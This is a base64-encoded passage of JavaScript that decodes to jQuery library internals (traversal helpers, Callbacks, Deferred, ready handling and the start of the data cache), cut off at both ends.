0gPSBhLAogICAgICAgICAgICAgICAgdGhpcy5sZW5ndGggPSAxLAogICAgICAgICAgICAgICAgdGhpcykgOiBuLmlzRnVuY3Rpb24oYSkgPyAidW5kZWZpbmVkIiAhPSB0eXBlb2YgeS5yZWFkeSA/IHkucmVhZHkoYSkgOiBhKG4pIDogKHZvaWQgMCAhPT0gYS5zZWxlY3RvciAmJiAodGhpcy5zZWxlY3RvciA9IGEuc2VsZWN0b3IsCiAgICAgICAgICAgICAgICB0aGlzLmNvbnRleHQgPSBhLmNvbnRleHQpLAogICAgICAgICAgICAgICAgbi5tYWtlQXJyYXkoYSwgdGhpcykpCiAgICAgICAgfQogICAgOwogICAgQS5wcm90b3R5cGUgPSBuLmZuLAogICAgICAgIHkgPSBuKGwpOwogICAgdmFyIEIgPSAvXig/OnBhcmVudHN8cHJldig/OlVudGlsfEFsbCkpLwogICAgICAgICwgQyA9IHsKICAgICAgICBjaGlsZHJlbjogITAsCiAgICAgICAgY29udGVudHM6ICEwLAogICAgICAgIG5leHQ6ICEwLAogICAgICAgIHByZXY6ICEwCiAgICB9OwogICAgbi5leHRlbmQoewogICAgICAgIGRpcjogZnVuY3Rpb24oYSwgYiwgYykgewogICAgICAgICAgICB2YXIgZCA9IFtdCiAgICAgICAgICAgICAgICAsIGUgPSB2b2lkIDAgIT09IGM7CiAgICAgICAgICAgIHdoaWxlICgoYSA9IGFbYl0pICYmIDkgIT09IGEubm9kZVR5cGUpCiAgICAgICAgICAgICAgICBpZiAoMSA9PT0gYS5ub2RlVHlwZSkgewogICAgICAgICAgICAgICAgICAgIGlmIChlICYmIG4oYSkuaXMoYykpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIGQucHVzaChhKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZAogICAgICAgIH0sCiAgICAgICAgc2libGluZzogZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICBmb3IgKHZhciBjID0gW107IGE7IGEgPSBhLm5leHRTaWJsaW5nKQogICAgICAgICAgICAgICAgMSA9PT0gYS5ub2RlVHlwZSAmJiBhICE9PSBiICYmIGMucHVzaChhKTsKICAgICAgICAgICAgcmV0dXJuIGMKICAgICAgICB9CiAgICB9KSwKICAgICAgICBuLmZuLmV4dGVuZCh7CiAgICAgICAgICAgIGhhczogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgdmFyIGIgPSBuKGEsIHRoaXMpCiAgICAgICAgICAgICAgICAgICAgLCBjID0gYi5sZW5ndGg7CiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5maWx0ZXIoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgYSA9IDA7IGMgPiBhOyBhKyspCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChuLmNvbnRhaW5zKHRoaXMsIGJbYV0pKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICEwCiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICB9LAogICAgICAgICAgICBjbG9zZXN0OiBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICBmb3IgKHZhciBjLCBkID0gMCwgZSA9IHRoaXMubGVuZ3RoLCBmID0gW10sIGcgPSB1LnRlc3QoYSkgfHwgInN0cmluZyIgIT0gdHlwZW9mIGEgPyBuKGEsIGIgfHwgdGhpcy5jb250ZXh0KSA6IDA7IGUgPiBkOyBkKyspCiAgICAgICAgICAgICAgICAgICAgZm9yIChjID0gdGhpc1tkXTsgYyAmJiBjICE9PSBiOyBjID0gYy5wYXJlbnROb2RlKQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoYy5ub2RlVHlwZSA8IDExICYmIChnID8gZy5pbmRleChjKSA+IC0xIDogMSA9PT0gYy5ub2RlVHlwZSAmJiBuLmZpbmQubWF0Y2hlc1NlbGVjdG9yKGMsIGEpKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZi5wdXNoKGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmV0dXJuIHRoaXMucHVzaFN0YWNrKGYubGVuZ3RoID4gMSA/IG4udW5pcXVlKGYpIDogZikKICAgICAgICAgICAgfSwKICAgICAgICAgICAgaW5kZXg6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIHJldHVybiBhID8gInN0cmluZyIgPT0gdHlwZW9mIGEgPyBnLmNhbGwobihhKSwgdGhpc1swXSkgOiBnLmNhbGwodGhpcywgYS5qcXVlcnkgPyBhWzBdIDogYSkgOiB0aGlzWzBdICYmIHRoaXNbMF0ucGFyZW50Tm9kZSA/IHRoaXMuZmlyc3QoKS5wcmV2QWxsKCkubGVuZ3RoIDogLTEKICAgICAgICAgICAgfSwKICAgICAgICAgICAgYWRkOiBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5wdXNoU3RhY2sobi51bmlxdWUobi5tZXJnZSh0aGlzLmdldCgpLCBuKGEsIGIpKSkpCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIGFkZEJhY2s6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIHJldHVybiB0aGlzLmFkZChudWxsID09IGEgPyB0aGlzLnByZXZPYmplY3QgOiB0aGlzLnByZXZPYmplY3QuZmlsdGVyKGEpKQogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICBmdW5jdGlvbiBEKGEsIGIpIHsKICAgICAgICB3aGlsZSAoKGEgPSBhW2JdKSAmJiAxICE9PSBhLm5vZGVUeXBlKQogICAgICAgICAgICA7CiAgICAgICAgcmV0dXJuIGEKICAgIH0KICAgIG4uZWFjaCh7CiAgICAgICAgcGFyZW50OiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgIHZhciBiID0gYS5wYXJlbnROb2RlOwogICAgICAgICAgICByZXR1cm4gYiAmJiAxMSAhPT0gYi5ub2RlVHlwZSA/IGIgOiBudWxsCiAgICAgICAgfSwKICAgICAgICBwYXJlbnRzOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgIHJldHVybiBuLmRpcihhLCAicGFyZW50Tm9kZSIpCiAgICAgICAgfSwKICAgICAgICBwYXJlbnRzVW50aWw6IGZ1bmN0aW9uKGEsIGIsIGMpIHsKICAgICAgICAgICAgcmV0dXJuIG4uZGlyKGEsICJwYXJlbnROb2RlIiwgYykKICAgICAgICB9LAogICAgICAgIG5leHQ6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgcmV0dXJuIEQoYSwgIm5leHRTaWJsaW5nIikKICAgICAgICB9LAogICAgICAgIHByZXY6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgcmV0dXJuIEQoYSwgInByZXZpb3VzU2libGluZyIpCiAgICAgICAgfSwKICAgICAgICBuZXh0QWxsOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgIHJldHVybiBuLmRpcihhLCAibmV4dFNpYmxpbmciKQogICAgICAgIH0sCiAgICAgICAgcHJldkFsbDogZnVuY3Rpb24oYSkgewogICAgICAgICAgICByZXR1cm4gbi5kaXIoYSwgInByZXZpb3VzU2libGluZyIpCiAgICAgICAgfSwKICAgICAgICBuZXh0VW50aWw6IGZ1bmN0aW9uKGEsIGIsIGMpIHsKICAgICAgICAgICAgcmV0dXJuIG4uZGlyKGEsICJuZXh0U2libGluZyIsIGMpCiAgICAgICAgfSwKICAgICAgICBwcmV2VW50aWw6IGZ1bmN0aW9uKGEsIGIsIGMpIHsKICAgICAgICAgICAgcmV0dXJuIG4uZGlyKGEsICJwcmV2aW91c1NpYmxpbmciLCBjKQogICAgICAgIH0sCiAgICAgICAgc2libGluZ3M6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgcmV0dXJuIG4uc2libGluZygoYS5wYXJlbnROb2RlIHx8IHt9KS5maXJzdENoaWxkLCBhKQogICAgICAgIH0sCiAgICAgICAgY2hpbGRyZW46IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgcmV0dXJuIG4uc2libGluZyhhLmZpcnN0Q2hpbGQpCiAgICAgICAgfSwKICAgICAgICBjb250ZW50czogZnVuY3Rpb24oYSkgewogICAgICAgICAgICByZXR1cm4gYS5jb250ZW50RG9jdW1lbnQgfHwgbi5tZXJnZShbXSwgYS5jaGlsZE5vZGVzKQogICAgICAgIH0KICAgIH0sIGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICBuLmZuW2FdID0gZnVuY3Rpb24oYywgZCkgewogICAgICAgICAgICB2YXIgZSA9IG4ubWFwKHRoaXMsIGIsIGMpOwogICAgICAgICAgICByZXR1cm4gIlVudGlsIiAhPT0gYS5zbGljZSgtNSkgJiYgKGQgPSBjKSwKICAgICAgICAgICAgZCAmJiAic3RyaW5nIiA9PSB0eXBlb2YgZCAmJiAoZSA9IG4uZmlsdGVyKGQsIGUpKSwKICAgICAgICAgICAgdGhpcy5sZW5ndGggPiAxICYmIChDW2FdIHx8IG4udW5pcXVlKGUpLAogICAgICAgICAgICBCLnRlc3QoYSkgJiYgZS5yZXZlcnNlKCkpLAogICAgICAgICAgICAgICAgdGhpcy5wdXNoU3RhY2soZSkKICAgICAgICB9CiAgICB9KTsKICAgIHZhciBFID0gL1xTKy9nCiAgICAgICAgLCBGID0ge307CiAgICBmdW5jdGlvbiBHKGEpIHsKICAgICAgICB2YXIgYiA9IEZbYV0gPSB7fTsKICAgICAgICByZXR1cm4gbi5lYWNoKGEubWF0Y2goRSkgfHwgW10sIGZ1bmN0aW9uKGEsIGMpIHsKICAgICAgICAgICAgYltjXSA9ICEwCiAgICAgICAgfSksCiAgICAgICAgICAgIGIKICAgIH0KICAgIG4uQ2FsbGJhY2tzID0gZnVuY3Rpb24oYSkgewogICAgICAgIGEgPSAic3RyaW5nIiA9PSB0eXBlb2YgYSA/IEZbYV0gfHwgRyhhKSA6IG4uZXh0ZW5kKHt9LCBhKTsKICAgICAgICB2YXIgYiwgYywgZCwgZSwgZiwgZywgaCA9IFtdLCBpID0gIWEub25jZSAmJiBbXSwgaiA9IGZ1bmN0aW9uKGwpIHsKICAgICAgICAgICAgZm9yIChiID0gYS5tZW1vcnkgJiYgbCwKICAgICAgICAgICAgICAgICAgICAgYyA9ICEwLAogICAgICAgICAgICAgICAgICAgICBnID0gZSB8fCAwLAogICAgICAgICAgICAgICAgICAgICBlID0gMCwKICAgICAgICAgICAgICAgICAgICAgZiA9IGgubGVuZ3RoLAogICAgICAgICAgICAgICAgICAgICBkID0gITA7IGggJiYgZiA+IGc7IGcrKykKICAgICAgICAgICAgICAgIGlmIChoW2ddLmFwcGx5KGxbMF0sIGxbMV0pID09PSAhMSAmJiBhLnN0b3BPbkZhbHNlKSB7CiAgICAgICAgICAgICAgICAgICAgYiA9ICExOwogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIGQgPSAhMSwKICAgICAgICAgICAgaCAmJiAoaSA/IGkubGVuZ3RoICYmIGooaS5zaGlmdCgpKSA6IGIgPyBoID0gW10gOiBrLmRpc2FibGUoKSkKICAgICAgICB9LCBrID0gewogICAgICAgICAgICBhZGQ6IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgaWYgKGgpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgYyA9IGgubGVuZ3RoOwogICAgICAgICAgICAgICAgICAgICFmdW5jdGlvbiBnKGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgbi5lYWNoKGIsIGZ1bmN0aW9uKGIsIGMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBkID0gbi50eXBlKGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgImZ1bmN0aW9uIiA9PT0gZCA/IGEudW5pcXVlICYmIGsuaGFzKGMpIHx8IGgucHVzaChjKSA6IGMgJiYgYy5sZW5ndGggJiYgInN0cmluZyIgIT09IGQgJiYgZyhjKQogICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgIH0oYXJndW1lbnRzKSwKICAgICAgICAgICAgICAgICAgICAgICAgZCA/IGYgPSBoLmxlbmd0aCA6IGIgJiYgKGUgPSBjLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaihiKSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJldHVybiB0aGlzCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHJlbW92ZTogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gaCAmJiBuLmVhY2goYXJndW1lbnRzLCBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGM7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gbi5pbkFycmF5KGIsIGgsIGMpKSA+IC0xKQogICAgICAgICAgICAgICAgICAgICAgICBoLnNwbGljZShjLCAxKSwKICAgICAgICAgICAgICAgICAgICAgICAgZCAmJiAoZiA+PSBjICYmIGYtLSwKICAgICAgICAgICAgICAgICAgICAgICAgZyA+PSBjICYmIGctLSkKICAgICAgICAgICAgICAgIH0pLAogICAgICAgICAgICAgICAgICAgIHRoaXMKICAgICAgICAgICAgfSwKICAgICAgICAgICAgaGFzOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gYSA/IG4uaW5BcnJheShhLCBoKSA+IC0xIDogISghaCB8fCAhaC5sZW5ndGgpCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIGVtcHR5OiBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIHJldHVybiBoID0gW10sCiAgICAgICAgICAgICAgICAgICAgZiA9IDAsCiAgICAgICAgICAgICAgICAgICAgdGhpcwogICAgICAgICAgICB9LAogICAgICAgICAgICBkaXNhYmxlOiBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIHJldHVybiBoID0gaSA9IGIgPSB2b2lkIDAsCiAgICAgICAgICAgICAgICAgICAgdGhpcwogICAgICAgICAgICB9LAogICAgICAgICAgICBkaXNhYmxlZDogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gIWgKICAgICAgICAgICAgfSwKICAgICAgICAgICAgbG9jazogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gaSA9IHZvaWQgMCwKICAgICAgICAgICAgICAgIGIgfHwgay5kaXNhYmxlKCksCiAgICAgICAgICAgICAgICAgICAgdGhpcwogICAgICAgICAgICB9LAogICAgICAgICAgICBsb2NrZWQ6IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgcmV0dXJuICFpCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIGZpcmVXaXRoOiBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gIWggfHwgYyAmJiAhaSB8fCAoYiA9IGIgfHwgW10sCiAgICAgICAgICAgICAgICAgICAgYiA9IFthLCBiLnNsaWNlID8gYi5zbGljZSgpIDogYl0sCiAgICAgICAgICAgICAgICAgICAgZCA/IGkucHVzaChiKSA6IGooYikpLAogICAgICAgICAgICAgICAgICAgIHRoaXMKICAgICAgICAgICAgfSwKICAgICAgICAgICAgZmlyZTogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gay5maXJlV2l0aCh0aGlzLCBhcmd1bWVudHMpLAogICAgICAgICAgICAgICAgICAgIHRoaXMKICAgICAgICAgICAgfSwKICAgICAgICAgICAgZmlyZWQ6IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgcmV0dXJuICEhYwogICAgICAgICAgICB9CiAgICAgICAgfTsKICAgICAgICByZXR1cm4gawogICAgfQogICAgICAgICwKICAgICAgICBuLmV4dGVuZCh7CiAgICAgICAgICAgIERlZmVycmVkOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICB2YXIgYiA9IFtbInJlc29sdmUiLCAiZG9uZSIsIG4uQ2FsbGJhY2tzKCJvbmNlIG1lbW9yeSIpLCAicmVzb2x2ZWQiXSwgWyJyZWplY3QiLCAiZmFpbCIsIG4uQ2FsbGJhY2tzKCJvbmNlIG1lbW9yeSIpLCAicmVqZWN0ZWQiXSwgWyJub3RpZnkiLCAicHJvZ3Jlc3MiLCBuLkNhbGxiYWNrcygibWVtb3J5IildXQogICAgICAgICAgICAgICAgICAgICwgYyA9ICJwZW5kaW5nIgogICAgICAgICAgICAgICAgICAgICwgZCA9IHsKICAgICAgICAgICAgICAgICAgICBzdGF0ZTogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBjCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBhbHdheXM6IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZS5kb25lKGFyZ3VtZW50cykuZmFpbChhcmd1bWVudHMpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpcwogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgdGhlbjogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBhID0gYXJndW1lbnRzOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gbi5EZWZlcnJlZChmdW5jdGlvbihjKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuLmVhY2goYiwgZnVuY3Rpb24oYiwgZikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBnID0gbi5pc0Z1bmN0aW9uKGFbYl0pICYmIGFbYl07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZVtmWzFdXShmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGEgPSBnICYmIGcuYXBwbHkodGhpcywgYXJndW1lbnRzKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYSAmJiBuLmlzRnVuY3Rpb24oYS5wcm9taXNlKSA/IGEucHJvbWlzZSgpLmRvbmUoYy5yZXNvbHZlKS5mYWlsKGMucmVqZWN0KS5wcm9ncmVzcyhjLm5vdGlmeSkgOiBjW2ZbMF0gKyAiV2l0aCJdKHRoaXMgPT09IGQgPyBjLnByb21pc2UoKSA6IHRoaXMsIGcgPyBbYV0gOiBhcmd1bWVudHMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEgPSBudWxsCiAgICAgICAgICAgICAgICAgICAgICAgIH0pLnByb21pc2UoKQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgcHJvbWlzZTogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gbnVsbCAhPSBhID8gbi5leHRlbmQoYSwgZCkgOiBkCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICwgZSA9IHt9OwogICAgICAgICAgICAgICAgcmV0dXJuIGQucGlwZSA9IGQudGhlbiwKICAgICAgICAgICAgICAgICAgICBuLmVhY2goYiwgZnVuY3Rpb24oYSwgZikgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgZyA9IGZbMl0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgaCA9IGZbM107CiAgICAgICAgICAgICAgICAgICAgICAgIGRbZlsxXV0gPSBnLmFkZCwKICAgICAgICAgICAgICAgICAgICAgICAgaCAmJiBnLmFkZChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGMgPSBoCiAgICAgICAgICAgICAgICAgICAgICAgIH0sIGJbMSBeIGFdWzJdLmRpc2FibGUsIGJbMl1bMl0ubG9jayksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlW2ZbMF1dID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGVbZlswXSArICJXaXRoIl0odGhpcyA9PT0gZSA/IGQgOiB0aGlzLCBhcmd1bWVudHMpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGlzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlW2ZbMF0gKyAiV2l0aCJdID0gZy5maXJlV2l0aAogICAgICAgICAgICAgICAgICAgIH0pLAogICAgICAgICAgICAgICAgICAgIGQucHJvbWlzZShlKSwKICAgICAgICAgICAgICAgIGEgJiYgYS5jYWxsKGUsIGUpLAogICAgICAgICAgICAgICAgICAgIGUKICAgICAgICAgICAgfSwKICAgICAgICAgICAgd2hlbjogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgdmFyIGIgPSAwLCBjID0gZC5jYWxsKGFyZ3VtZW50cyksIGUgPSBjLmxlbmd0aCwgZiA9IDEgIT09IGUgfHwgYSAmJiBuLmlzRnVuY3Rpb24oYS5wcm9taXNlKSA/IGUgOiAwLCBnID0gMSA9PT0gZiA/IGEgOiBuLkRlZmVycmVkKCksIGggPSBmdW5jdGlvbihhLCBiLCBjKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgYlthXSA9IHRoaXMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjW2FdID0gYXJndW1lbnRzLmxlbmd0aCA+IDEgPyBkLmNhbGwoYXJndW1lbnRzKSA6IGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjID09PSBpID8gZy5ub3RpZnlXaXRoKGIsIGMpIDogLS1mIHx8IGcucmVzb2x2ZVdpdGgoYiwgYykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9LCBpLCBqLCBrOwogICAgICAgICAgICAgICAgaWYgKGUgPiAxKQogICAgICAgICAgICAgICAgICAgIGZvciAoaSA9IG5ldyBBcnJheShlKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBqID0gbmV3IEFycmF5KGUpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIGsgPSBuZXcgQXJyYXkoZSk7IGUgPiBiOyBiKyspCiAgICAgICAgICAgICAgICAgICAgICAgIGNbYl0gJiYgbi5pc0Z1bmN0aW9uKGNbYl0ucHJvbWlzZSkgPyBjW2JdLnByb21pc2UoKS5kb25lKGgoYiwgaywgYykpLmZhaWwoZy5yZWplY3QpLnByb2dyZXNzKGgoYiwgaiwgaSkpIDogLS1mOwogICAgICAgICAgICAgICAgcmV0dXJuIGYgfHwgZy5yZXNvbHZlV2l0aChrLCBjKSwKICAgICAgICAgICAgICAgICAgICBnLnByb21pc2UoKQogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICB2YXIgSDsKICAgIG4uZm4ucmVhZHkgPSBmdW5jdGlvbihhKSB7CiAgICAgICAgcmV0dXJuIG4ucmVhZHkucHJvbWlzZSgpLmRvbmUoYSksCiAgICAgICAgICAgIHRoaXMKICAgIH0KICAgICAgICAsCiAgICAgICAgbi5leHRlbmQoewogICAgICAgICAgICBpc1JlYWR5OiAhMSwKICAgICAgICAgICAgcmVhZHlXYWl0OiAxLAogICAgICAgICAgICBob2xkUmVhZHk6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIGEgPyBuLnJlYWR5V2FpdCsrIDogbi5yZWFkeSghMCkKICAgICAgICAgICAgfSwKICAgICAgICAgICAgcmVhZHk6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIChhID09PSAhMCA/IC0tbi5yZWFkeVdhaXQgOiBuLmlzUmVhZHkpIHx8IChuLmlzUmVhZHkgPSAhMCwKICAgICAgICAgICAgICAgIGEgIT09ICEwICYmIC0tbi5yZWFkeVdhaXQgPiAwIHx8IChILnJlc29sdmVXaXRoKGwsIFtuXSksCiAgICAgICAgICAgICAgICBuLmZuLnRyaWdnZXJIYW5kbGVyICYmIChuKGwpLnRyaWdnZXJIYW5kbGVyKCJyZWFkeSIpLAogICAgICAgICAgICAgICAgICAgIG4obCkub2ZmKCJyZWFkeSIpKSkpCiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgIGZ1bmN0aW9uIEkoKSB7CiAgICAgICAgbC5yZW1vdmVFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIiwgSSwgITEpLAogICAgICAgICAgICBhLnJlbW92ZUV2ZW50TGlzdGVuZXIoImxvYWQiLCBJLCAhMSksCiAgICAgICAgICAgIG4ucmVhZHkoKQogICAgfQogICAgbi5yZWFkeS5wcm9taXNlID0gZnVuY3Rpb24oYikgewogICAgICAgIHJldHVybiBIIHx8IChIID0gbi5EZWZlcnJlZCgpLAogICAgICAgICAgICAiY29tcGxldGUiID09PSBsLnJlYWR5U3RhdGUgPyBzZXRUaW1lb3V0KG4ucmVhZHkpIDogKGwuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIEksICExKSwKICAgICAgICAgICAgICAgIGEuYWRkRXZlbnRMaXN0ZW5lcigibG9hZCIsIEksICExKSkpLAogICAgICAgICAgICBILnByb21pc2UoYikKICAgIH0KICAgICAgICAsCiAgICAgICAgbi5yZWFkeS5wcm9taXNlKCk7CiAgICB2YXIgSiA9IG4uYWNjZXNzID0gZnVuY3Rpb24oYSwgYiwgYywgZCwgZSwgZiwgZykgewogICAgICAgICAgICB2YXIgaCA9IDAKICAgICAgICAgICAgICAgICwgaSA9IGEubGVuZ3RoCiAgICAgICAgICAgICAgICAsIGogPSBudWxsID09IGM7CiAgICAgICAgICAgIGlmICgib2JqZWN0IiA9PT0gbi50eXBlKGMpKSB7CiAgICAgICAgICAgICAgICBlID0gITA7CiAgICAgICAgICAgICAgICBmb3IgKGggaW4gYykKICAgICAgICAgICAgICAgICAgICBuLmFjY2VzcyhhLCBiLCBoLCBjW2hdLCAhMCwgZiwgZykKICAgICAgICAgICAgfSBlbHNlIGlmICh2b2lkIDAgIT09IGQgJiYgKGUgPSAhMCwKICAgICAgICAgICAgbi5pc0Z1bmN0aW9uKGQpIHx8IChnID0gITApLAogICAgICAgICAgICBqICYmIChnID8gKGIuY2FsbChhLCBkKSwKICAgICAgICAgICAgICAgIGIgPSBudWxsKSA6IChqID0gYiwKICAgICAgICAgICAgICAgICAgICBiID0gZnVuY3Rpb24oYSwgYiwgYykgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gai5jYWxsKG4oYSksIGMpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICApKSwKICAgICAgICAgICAgICAgIGIpKQogICAgICAgICAgICAgICAgZm9yICg7IGkgPiBoOyBoKyspCiAgICAgICAgICAgICAgICAgICAgYihhW2hdLCBjLCBnID8gZCA6IGQuY2FsbChhW2hdLCBoLCBiKGFbaF0sIGMpKSk7CiAgICAgICAgICAgIHJldHVybiBlID8gYSA6IGogPyBiLmNhbGwoYSkgOiBpID8gYihhWzBdLCBjKSA6IGYKICAgICAgICB9CiAgICA7CiAgICBuLmFjY2VwdERhdGEgPSBmdW5jdGlvbihhKSB7CiAgICAgICAgcmV0dXJuIDEgPT09IGEubm9kZVR5cGUgfHwgOSA9PT0gYS5ub2RlVHlwZSB8fCAhK2Eubm9kZVR5cGUKICAgIH0KICAgIDsKICAgIGZ1bmN0aW9uIEsoKSB7CiAgICAgICAgT2JqZWN0LmRlZmluZVByb3BlcnR5KHRoaXMuY2FjaGUgPSB7fSwgMCwgewogICAgICAgICAgICBnZXQ6IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgcmV0dXJuIHt9CiAgICAgICAgICAgIH0KICAgICAgICB9KSwKICAgICAgICAgICAgdGhpcy5leHBhbmRvID0gbi5leHBhbmRvICsgSy51aWQrKwogICAgfQogICAgSy51aWQgPSAxLAogICAgICAgIEsuYWNjZXB0cyA9IG4uYWNjZXB0RGF0YSwKICAgICAgICBLLnByb3RvdHlwZSA9IHsKICAgICAgICAgICAga2V5OiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICBpZiAoIUsuYWNjZXB0cyhhKSkKICAgICAgICAgICAgICAgICAgICByZXR1cm4gMDsKICAgICAgICAgICAgICAgIHZhciBiID0ge30KICAgICAgICAgICAgICAgICAgICAsIGMgPSBhW3RoaXMuZXhwYW5kb107CiAgICAgICAgICAgICAgICBpZiAoIWMpIHsKICAgICAgICAgICAgICAgICAgICBjID0gSy51aWQrKzsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBiW3RoaXMuZXhwYW5kb10gPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZTogYwogICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmRlZmluZVByb3BlcnRpZXMoYSwgYikKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGJbdGhpcy5leHBhbmRvXSA9IGMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuLmV4dGVuZChhLCBiKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJldHVybiB0aGlzLmNhY2hlW2NdIHx8ICh0aGlz